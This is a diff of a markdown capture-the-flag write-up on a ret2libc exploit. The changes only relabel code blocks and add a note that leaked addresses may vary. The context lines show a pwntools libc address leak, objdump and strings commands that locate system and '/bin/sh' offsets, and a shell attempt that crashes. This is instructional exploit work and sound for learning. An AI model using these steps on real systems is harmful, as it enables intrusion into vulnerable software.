@@ -139,8 +139,8 @@ leak = u64(p.recvline().strip().ljust(8, b'\x00')) # in short, converts to 64 bi
 log.info("puts@libc leak address: " + hex(leak))
 ```
 
-When u run the script you should see something like this:
-```sh
+When u run the script you should see something like this (your address may vary):
+```shell
 [*] puts@libc leak address: 0x7fa463687bd0
 ```
 
@@ -151,13 +151,13 @@ In this case we want to call our own shell (`/bin/sh`) using `system` to grab th
 
 ### Finding offsets of functions
 
-```sh
+```shell
 objdump -T libc.so.6 | grep -E "(system$|puts$)"
 0000000000087bd0  w   DF .text  0000000000000226  GLIBC_2.2.5 puts
 0000000000058740  w   DF .text  000000000000002d  GLIBC_2.2.5 system
 ```
 
-```sh
+```shell
 strings -t x libc.so.6 | grep "/bin/sh"         
  1cb42f /bin/sh
 ```
@@ -230,7 +230,7 @@ p.interactive()
 
 However, we will face this still:
 
-```sh
+```shell
 $ 
 [*] Process './chall_patched' stopped with exit code -11 (SIGSEGV) (pid 161176)
 [*] Got EOF while sending in interactive
